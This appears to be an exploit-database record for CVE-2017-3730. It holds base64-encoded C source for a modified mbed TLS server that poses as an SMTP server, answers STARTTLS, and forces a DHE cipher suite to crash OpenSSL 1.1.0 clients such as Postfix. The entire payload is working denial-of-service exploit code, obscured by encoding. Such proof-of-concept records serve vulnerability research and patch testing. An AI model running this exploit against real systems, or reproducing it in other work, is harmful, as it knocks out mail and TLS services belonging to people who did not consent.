{
    "source": "exploit-database", 
    "exploit": "Ly8gU291cmNlOiBodHRwczovL2d1aWRvdnJhbmtlbi53b3JkcHJlc3MuY29tLzIwMTcvMDEvMjYvY3ZlLTIwMTctMzczMC1vcGVuc3NsLTEtMS0wLXJlbW90ZS1jbGllbnQtZGVuaWFsLW9mLXNlcnZpY2UtYWZmZWN0cy1zZXJ2ZXJzLWFzLXdlbGwtcG9jLw0KDQovKg0KICogIFNTTCBzZXJ2ZXIgZGVtb25zdHJhdGlvbiBwcm9ncmFtDQogKg0KICogIENvcHlyaWdodCAoQykgMjAwNi0yMDE1LCBBUk0gTGltaXRlZCwgQWxsIFJpZ2h0cyBSZXNlcnZlZA0KICogIFNQRFgtTGljZW5zZS1JZGVudGlmaWVyOiBBcGFjaGUtMi4wDQogKg0KICogIExpY2Vuc2VkIHVuZGVyIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvbiAyLjAgKHRoZSAiTGljZW5zZSIpOyB5b3UgbWF5DQogKiAgbm90IHVzZSB0aGlzIGZpbGUgZXhjZXB0IGluIGNvbXBsaWFuY2Ugd2l0aCB0aGUgTGljZW5zZS4NCiAqICBZb3UgbWF5IG9idGFpbiBhIGNvcHkgb2YgdGhlIExpY2Vuc2UgYXQNCiAqDQogKiAgaHR0cDovL3d3dy5hcGFjaGUub3JnL2xpY2Vuc2VzL0xJQ0VOU0UtMi4wDQogKg0KICogIFVubGVzcyByZXF1aXJlZCBieSBhcHBsaWNhYmxlIGxhdyBvciBhZ3JlZWQgdG8gaW4gd3JpdGluZywgc29mdHdhcmUNCiAqICBkaXN0cmlidXRlZCB1bmRlciB0aGUgTGljZW5zZSBpcyBkaXN0cmlidXRlZCBvbiBhbiAiQVMgSVMiIEJBU0lTLCBXSVRIT1VUDQogKiAgV0FSUkFOVElFUyBPUiBDT05ESVRJT05TIE9GIEFOWSBLSU5ELCBlaXRoZXIgZXhwcmVzcyBvciBpbXBsaWVkLg0KICogIFNlZSB0aGUgTGljZW5zZSBmb3IgdGhlIHNwZWNpZmljIGxhbmd1YWdlIGdvdmVybmluZyBwZXJtaXNzaW9ucyBhbmQNCiAqICBsaW1pdGF0aW9ucyB1bmRlciB0aGUgTGljZW5zZS4NCiAqDQogKiAgVGhpcyBmaWxlIGlzIHBhcnQgb2YgbWJlZCBUTFMgKGh0dHBzOi8vdGxzLm1iZWQub3JnKQ0KICovDQoNCi8qIFRha2VuIGZyb20gbWJlZCBUTFMgcHJvZ3JhbXMvc3NsL3NzbF9zZXJ2ZXIuYyBhbmQgbW9kaWZpZWQgdG8gY3Jhc2ggcG9zdGZpeC4NCiAqIEJlbG9uZ3MgdG8gaHR0cHM6Ly9naXRodWIuY29tL2d1aWRvdnJhbmtlbi9DVkUtMjAxNy0zNzMwDQoqLw0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KDQojaW5jbHVkZSAibWJlZHRscy9lbnRyb3B5LmgiDQojaW5jbHVkZSAibWJlZHRscy9jdHJfZHJiZy5oIg0KI2luY2x1ZGUgIm1iZWR0bHMvY2VydHMuaCINCiNpbmNsdWRlICJtYmVkdGxzL3g1MDkuaCINCiNpbmNsdWRlICJtYmVkdGxzL3NzbC5oIg0KI2luY2x1ZGUgIm1iZWR0bHMvbmV0X3NvY2tldHMuaCINCiNpbmNsdWRlICJtYmVkdGxzL2Vycm9yLmgiDQojaW5jbHVkZSAibWJlZHRscy9kZWJ1Zy5oIg0KDQpzdGF0aWMgaW50IHdyaXRlX2FuZF9nZXRfcmVzcG9uc2UoIG1iZWR0bHNfbmV0X2NvbnRleHQgKnNvY2tfZmQsIGNoYXIgKmJ1Ziwgc2l6ZV90IGxlbiApDQp7DQogICAgaW50IHJldDsNCg0KICAgIGlmICggKHJldCA9IG1iZWR0bHNfbmV0X3NlbmQoIHNvY2tfZmQsICh1bnNpZ25lZCBjaGFyKilidWYsIHN0cmxlbihidWYpICkpIDw9IDAgKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCg0KICAgIG1lbXNldCggYnVmLCAwLCBsZW4gKTsNCiAgICByZXQgPSBtYmVkdGxzX25ldF9yZWN2KCBzb2NrX2ZkLCAodW5zaWduZWQgY2hhciopYnVmLCBsZW4gKTsNCiAgICByZXR1cm4gcmV0Ow0KfQ0KDQppbnQgbWFpbiggdm9pZCApDQp7DQogICAgaW50IHJldDsNCiAgICBtYmVkdGxzX25ldF9jb250ZXh0IGxpc3Rlbl9mZCwgY2xpZW50X2ZkOw0KICAgIGNoYXIgYnVmWzEwMjRdOw0KICAgIGNvbnN0IGNoYXIgKnBlcnMgPSAic3NsX3NlcnZlciI7DQoNCiAgICBpbnQgZm9yY2VfY2lwaGVyc3VpdGVbMl07DQogICAgbWJlZHRsc19lbnRyb3B5X2NvbnRleHQgZW50cm9weTsNCiAgICBtYmVkdGxzX2N0cl9kcmJnX2NvbnRleHQgY3RyX2RyYmc7DQogICAgbWJlZHRsc19zc2xfY29udGV4dCBzc2w7DQogICAgbWJlZHRsc19zc2xfY29uZmlnIGNvbmY7DQogICAgbWJlZHRsc194NTA5X2NydCBzcnZjZXJ0Ow0KICAgIG1iZWR0bHNfcGtfY29udGV4dCBwa2V5Ow0KDQogICAgbWJlZHRsc19uZXRfaW5pdCggJmxpc3Rlbl9mZCApOw0KICAgIG1iZWR0bHNfbmV0X2luaXQoICZjbGllbnRfZmQgKTsNCiAgICBtYmVkdGxzX3NzbF9pbml0KCAmc3NsICk7DQogICAgbWJlZHRsc19zc2xfY29uZmlnX2luaXQoICZjb25mICk7DQogICAgbWJlZHRsc194NTA5X2NydF9pbml0KCAmc3J2Y2VydCApOw0KICAgIG1iZWR0bHNfcGtfaW5pdCggJnBrZXkgKTsNCiAgICBtYmVkdGxzX2VudHJvcHlfaW5pdCggJmVudHJvcHkgKTsNCiAgICBtYmVkdGxzX2N0cl9kcmJnX2luaXQoICZjdHJfZHJiZyApOw0KDQogICAgcmV0ID0gbWJlZHRsc194NTA5X2NydF9wYXJzZSggJnNydmNlcnQsIChjb25zdCB1bnNpZ25lZCBjaGFyICopIG1iZWR0bHNfdGVzdF9zcnZfY3J0LA0KICAgICAgICAgICAgICAgICAgICAgICAgICBtYmVkdGxzX3Rlc3Rfc3J2X2NydF9sZW4gKTsNCiAgICBpZiggcmV0ICE9IDAgKQ0KICAgIHsNCiAgICAgICAgZ290byBleGl0Ow0KICAgIH0NCg0KICAgIHJldCA9IG1iZWR0bHNfeDUwOV9jcnRfcGFyc2UoICZzcnZjZXJ0LCAoY29uc3QgdW5zaWduZWQgY2hhciAqKSBtYmVkdGxzX3Rlc3RfY2FzX3BlbSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgbWJlZHRsc190ZXN0X2Nhc19wZW1fbGVuICk7DQogICAgaWYoIHJldCAhPSAwICkNCiAgICB7DQogICAgICAgIGdvdG8gZXhpdDsNCiAgICB9DQoNCiAgICByZXQgPSAgbWJlZHRsc19wa19wYXJzZV9rZXkoICZwa2V5LCAoY29uc3QgdW5zaWduZWQgY2hhciAqKSBtYmVkdGxzX3Rlc3Rfc3J2X2tleSwNCiAgICAgICAgICAgICAgICAgICAgICAgICBtYmVkdGxzX3Rlc3Rfc3J2X2tleV9sZW4sIE5VTEwsIDAgKTsNCiAgICBpZiggcmV0ICE9IDAgKQ0KICAgIHsNCiAgICAgICAgZ290byBleGl0Ow0KICAgIH0NCg0KICAgIGlmKCAoIHJldCA9IG1iZWR0bHNfbmV0X2JpbmQoICZsaXN0ZW5fZmQsIE5VTEwsICI4ODg4IiwgTUJFRFRMU19ORVRfUFJPVE9fVENQICkgKSAhPSAwICkNCiAgICB7DQogICAgICAgIGdvdG8gZXhpdDsNCiAgICB9DQoNCiAgICBpZiggKCByZXQgPSBtYmVkdGxzX2N0cl9kcmJnX3NlZWQoICZjdHJfZHJiZywgbWJlZHRsc19lbnRyb3B5X2Z1bmMsICZlbnRyb3B5LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIChjb25zdCB1bnNpZ25lZCBjaGFyICopIHBlcnMsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RybGVuKCBwZXJzICkgKSApICE9IDAgKQ0KICAgIHsNCiAgICAgICAgZ290byBleGl0Ow0KICAgIH0NCg0KICAgIGlmKCAoIHJldCA9IG1iZWR0bHNfc3NsX2NvbmZpZ19kZWZhdWx0cyggJmNvbmYsDQogICAgICAgICAgICAgICAgICAgIE1CRURUTFNfU1NMX0lTX1NFUlZFUiwNCiAgICAgICAgICAgICAgICAgICAgTUJFRFRMU19TU0xfVFJBTlNQT1JUX1NUUkVBTSwNCiAgICAgICAgICAgICAgICAgICAgTUJFRFRMU19TU0xfUFJFU0VUX0RFRkFVTFQgKSApICE9IDAgKQ0KICAgIHsNCiAgICAgICAgZ290byBleGl0Ow0KICAgIH0NCg0KICAgIG1iZWR0bHNfc3NsX2NvbmZfcm5nKCAmY29uZiwgbWJlZHRsc19jdHJfZHJiZ19yYW5kb20sICZjdHJfZHJiZyApOw0KDQoNCiAgICBtYmVkdGxzX3NzbF9jb25mX2NhX2NoYWluKCAmY29uZiwgc3J2Y2VydC5uZXh0LCBOVUxMICk7DQogICAgaWYoICggcmV0ID0gbWJlZHRsc19zc2xfY29uZl9vd25fY2VydCggJmNvbmYsICZzcnZjZXJ0LCAmcGtleSApICkgIT0gMCApDQogICAgew0KICAgICAgICBnb3RvIGV4aXQ7DQogICAgfQ0KDQogICAgZm9yY2VfY2lwaGVyc3VpdGVbMF0gPSBtYmVkdGxzX3NzbF9nZXRfY2lwaGVyc3VpdGVfaWQoICJUTFMtREhFLVJTQS1XSVRILUFFUy0yNTYtR0NNLVNIQTM4NCIgKTsNCiAgICBmb3JjZV9jaXBoZXJzdWl0ZVsxXSA9IDA7DQogICAgbWJlZHRsc19zc2xfY29uZl9jaXBoZXJzdWl0ZXMoICZjb25mLCBmb3JjZV9jaXBoZXJzdWl0ZSApOw0KDQogICAgaWYoICggcmV0ID0gbWJlZHRsc19zc2xfc2V0dXAoICZzc2wsICZjb25mICkgKSAhPSAwICkNCiAgICB7DQogICAgICAgIGdvdG8gZXhpdDsNCiAgICB9DQoNCnJlc2V0Og0KDQogICAgbWJlZHRsc19uZXRfZnJlZSggJmNsaWVudF9mZCApOw0KDQogICAgbWJlZHRsc19zc2xfc2Vzc2lvbl9yZXNldCggJnNzbCApOw0KDQogICAgaWYoICggcmV0ID0gbWJlZHRsc19uZXRfYWNjZXB0KCAmbGlzdGVuX2ZkLCAmY2xpZW50X2ZkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTlVMTCwgMCwgTlVMTCApICkgIT0gMCApDQogICAgew0KICAgICAgICBnb3RvIGV4aXQ7DQogICAgfQ0KICAgIA0KICAgIHNwcmludGYoYnVmLCAiMjIwIG9rXG4iKTsNCiAgICByZXQgPSB3cml0ZV9hbmRfZ2V0X3Jlc3BvbnNlKCAmY2xpZW50X2ZkLCBidWYsIHNpemVvZihidWYpKTsNCg0KICAgIGlmICggcmV0IDwgNSApIHsNCiAgICAgICAgZ290byBleGl0Ow0KICAgIH0NCg0KICAgIGlmICggc3RybmNtcChidWYsICJFSExPICIsIDUpICE9IDAgKSB7DQogICAgICAgIGdvdG8gZXhpdDsNCiAgICB9DQoNCiAgICBzcHJpbnRmKGJ1ZiwgIjI1MC1TSVpFIDE1NzI4NjQwMFxuMjUwLThCSVRNSU1FXG4yNTAtU1RBUlRUTFNcbjI1MC1FTkhBTkNFRFNUQVRVU0NPREVTXG4yNTAtUElQRUxJTklOR1xuMjUwLUNIVU5LSU5HXG4yNTAgU01UUFVURjhcbiIpOw0KICAgIHJldCA9IHdyaXRlX2FuZF9nZXRfcmVzcG9uc2UoICZjbGllbnRfZmQsIGJ1Ziwgc2l6ZW9mKGJ1ZikpOw0KDQogICAgaWYgKCByZXQgPCA4ICkgew0KICAgICAgICBnb3RvIGV4aXQ7DQogICAgfQ0KDQogICAgaWYgKCBzdHJuY21wKGJ1ZiwgIlNUQVJUVExTIiwgOCkgIT0gMCApIHsNCiAgICAgICAgZ290byBleGl0Ow0KICAgIH0NCiAgICBzcHJpbnRmKGJ1ZiwgIjIyMCBva1xuIik7DQogICAgcmV0ID0gbWJlZHRsc19uZXRfc2VuZCggJmNsaWVudF9mZCwgKHVuc2lnbmVkIGNoYXIqKWJ1Ziwgc3RybGVuKGJ1ZikgKTsNCiAgICBpZiAoIHJldCA8IDAgKSB7DQogICAgICAgIGdvdG8gZXhpdDsNCiAgICB9DQoNCiAgICBtYmVkdGxzX3NzbF9zZXRfYmlvKCAmc3NsLCAmY2xpZW50X2ZkLCBtYmVkdGxzX25ldF9zZW5kLCBtYmVkdGxzX25ldF9yZWN2LCBOVUxMICk7DQoNCg0KICAgIHdoaWxlKCAoIHJldCA9IG1iZWR0bHNfc3NsX2hhbmRzaGFrZSggJnNzbCApICkgIT0gMCApDQogICAgew0KICAgICAgICBpZiggcmV0ICE9IE1CRURUTFNfRVJSX1NTTF9XQU5UX1JFQUQgJiYgcmV0ICE9IE1CRURUTFNfRVJSX1NTTF9XQU5UX1dSSVRFICkNCiAgICAgICAgew0KICAgICAgICAgICAgZ290byByZXNldDsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHdoaWxlKCAoIHJldCA9IG1iZWR0bHNfc3NsX2Nsb3NlX25vdGlmeSggJnNzbCApICkgPCAwICkNCiAgICB7DQogICAgICAgIGlmKCByZXQgIT0gTUJFRFRMU19FUlJfU1NMX1dBTlRfUkVBRCAmJg0KICAgICAgICAgICAgcmV0ICE9IE1CRURUTFNfRVJSX1NTTF9XQU5UX1dSSVRFICkNCiAgICAgICAgew0KICAgICAgICAgICAgZ290byByZXNldDsNCiAgICAgICAgfQ0KICAgIH0NCg0KDQogICAgcmV0ID0gMDsNCiAgICBnb3RvIHJlc2V0Ow0KDQpleGl0Og0KDQogICAgbWJlZHRsc19uZXRfZnJlZSggJmNsaWVudF9mZCApOw0KICAgIG1iZWR0bHNfbmV0X2ZyZWUoICZsaXN0ZW5fZmQgKTsNCg0KICAgIG1iZWR0bHNfeDUwOV9jcnRfZnJlZSggJnNydmNlcnQgKTsNCiAgICBtYmVkdGxzX3BrX2ZyZWUoICZwa2V5ICk7DQogICAgbWJlZHRsc19zc2xfZnJlZSggJnNzbCApOw0KICAgIG1iZWR0bHNfc3NsX2NvbmZpZ19mcmVlKCAmY29uZiApOw0KICAgIG1iZWR0bHNfY3RyX2RyYmdfZnJlZSggJmN0cl9kcmJnICk7DQogICAgbWJlZHRsc19lbnRyb3B5X2ZyZWUoICZlbnRyb3B5ICk7DQoNCiAgICByZXR1cm4oIHJldCApOw0KfQ==", 
    "filename": "platforms/multiple/dos/41192.c", 
    "id": "41192", 
    "cves": [
        "CVE-2017-3730"
    ]
}